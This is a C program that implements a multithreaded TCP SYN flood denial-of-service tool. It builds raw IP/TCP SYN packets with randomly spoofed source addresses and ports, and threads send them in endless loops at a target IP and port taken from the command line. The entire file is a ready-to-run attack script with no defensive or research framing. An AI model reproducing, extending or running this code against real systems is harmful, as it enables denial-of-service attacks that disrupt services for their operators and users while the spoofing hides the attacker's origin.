#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <pthread.h>

// pseudo header needed for tcp header checksum calculation
struct pseudo_header
{
	u_int32_t source_address;
	u_int32_t dest_address;
	u_int8_t placeholder;
	u_int8_t protocol;
	u_int16_t tcp_length;
};

struct thread_para{
	int socketfd;
	struct sockaddr_in* desaddr;
};

#define DATAGRAM_LEN 4096
#define OPT_SIZE 20

int get_socket()
{
	int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if (sock == -1)
	{
		printf("socket creation failed\n");
		return 1;
	}
	int one = 1;
	
	const int *val = &one;
	if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) == -1)
	{
		printf("setsockopt(IP_HDRINCL, 1) failed\n");
		return 1;
	}
	return sock;
}

unsigned short checksum(const char *buf, unsigned size)
{
	unsigned sum = 0, i;

	/* Accumulate checksum */
	for (i = 0; i < size - 1; i += 2)
	{
		unsigned short word16 = *(unsigned short *) &buf[i];
		sum += word16;
	}

	/* Handle odd-sized case */
	if (size & 1)
	{
		unsigned short word16 = (unsigned char) buf[i];
		sum += word16;
	}

	/* Fold to get the ones-complement result */
	while (sum >> 16) sum = (sum & 0xFFFF)+(sum >> 16);

	/* Invert to get the negative in ones-complement arithmetic */
	return ~sum;
}

void create_syn_packet(struct sockaddr_in* daddr, char* out_packet, int* out_packet_len)
{

	srand(time(NULL));

	// source IP address configuration
	struct sockaddr_in saddr;
	saddr.sin_family = AF_INET;
	saddr.sin_port = htons(rand() % 65535); 
	char rand_src_ip[17];
	snprintf(rand_src_ip, 17, "%d.%d.%d.%d", rand()%255, rand()%255, rand()%255, rand()%255);
	if (inet_pton(AF_INET, rand_src_ip, &saddr.sin_addr) != 1)
	{
		printf("source IP configuration failed\n");
		exit(EXIT_FAILURE);
	} 
	// required structs for IP and TCP header
	struct iphdr *iph = (struct iphdr*)out_packet;
	struct tcphdr *tcph = (struct tcphdr*)(out_packet + sizeof(struct iphdr));
	struct pseudo_header psh;

	// IP header configuration
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + OPT_SIZE;
	iph->id = htonl(rand() % 65535); // id of this packet
	iph->frag_off = 0;
	iph->ttl = 64;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0; // correct calculation follows later
	iph->saddr = saddr.sin_addr.s_addr;
	iph->daddr = daddr->sin_addr.s_addr;

	// TCP header configuration
	tcph->source = saddr.sin_port;
	tcph->dest = daddr->sin_port;
	tcph->seq = htonl(rand() % 4294967295);
	tcph->ack_seq = htonl(0);
	tcph->doff = 10;
	tcph->fin = 0;
	tcph->syn = 1;
	tcph->rst = 0;
	tcph->psh = 0;
	tcph->ack = 0;
	tcph->urg = 0;
	tcph->check = 0; 
	tcph->window = htons(5840); // window size
	tcph->urg_ptr = 0;

	// TCP pseudo header for checksum calculation
	psh.source_address = saddr.sin_addr.s_addr;
	psh.dest_address = daddr->sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(sizeof(struct tcphdr) + OPT_SIZE);
	int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + OPT_SIZE;
	// fill pseudo packet
	char* pseudogram = malloc(psize);
	memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
	memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + OPT_SIZE);

	// TCP options are only set in the SYN packet
	// ---- set mss ----
	out_packet[40] = 0x02;
	out_packet[41] = 0x04;
	int16_t mss = htons(48); // mss value
	memcpy(out_packet + 42, &mss, sizeof(int16_t));
	// ---- enable SACK ----
	out_packet[44] = 0x04;
	out_packet[45] = 0x02;
	// do the same for the pseudo header
	pseudogram[32] = 0x02;
	pseudogram[33] = 0x04;
	memcpy(pseudogram + 34, &mss, sizeof(int16_t));
	pseudogram[36] = 0x04;
	pseudogram[37] = 0x02;

	tcph->check = checksum((const char*)pseudogram, psize);
	iph->check = checksum((const char*)out_packet, iph->tot_len);
	*out_packet_len = iph->tot_len;
	free(pseudogram);
}

void* thread_handler(void* para)
{
	char* packet = (char*)calloc(DATAGRAM_LEN, sizeof(char));
	int packet_len;
	int sent;
	struct thread_para* temp = (struct thread_para*) para;

	while(1)
	{
		create_syn_packet(temp->desaddr, packet, &packet_len);
		if ((sent = sendto(temp->socketfd, packet, packet_len, 0, (struct sockaddr*)temp->desaddr, sizeof(struct sockaddr))) == -1)
		{
			printf("sendto() failed\n");
		}
		else
		{
			printf("successfully sent %d bytes SYN!\n", sent);
		}
		memset(packet, 0, packet_len);
	}

}

int main(int argc, char** argv)
{
	if (argc != 4)
	{
		printf("USAGE %s <target-ip> <port> <num_of_threads>\n", argv[0]);
		return 1;
	}

	int num_of_threads = atoi(argv[3]);
    pthread_t* thread_id = (pthread_t*) calloc(num_of_threads, sizeof(pthread_t));  
    struct thread_para* thread_prime = (struct thread_para*) calloc(num_of_threads, sizeof(struct thread_para));

	// destination IP address configuration
	struct sockaddr_in daddr;
	daddr.sin_family = AF_INET;
	daddr.sin_port = htons(atoi(argv[2]));
	if (inet_pton(AF_INET, argv[1], &daddr.sin_addr) != 1)
	{
		printf("destination IP configuration failed\n");
		return 1;
	}

	for (int i = 0; i < num_of_threads; i++)
	{
		thread_prime[i].socketfd = get_socket();
		thread_prime[i].desaddr = &daddr; 
		if (pthread_create(&thread_id[i], NULL, thread_handler, (void*) &thread_prime[i]) != 0) 
		{
			perror("Error creating thread");
			return 1;
		} 
		printf("%ld\n", thread_id[i]);
	}
	for (int i = 0; i < num_of_threads; i++)
	{
		if (pthread_join(thread_id[i], NULL) != 0) 
		{
			perror("Error joining thread");
			return 1;
		}
	}
	exit(EXIT_SUCCESS);

}
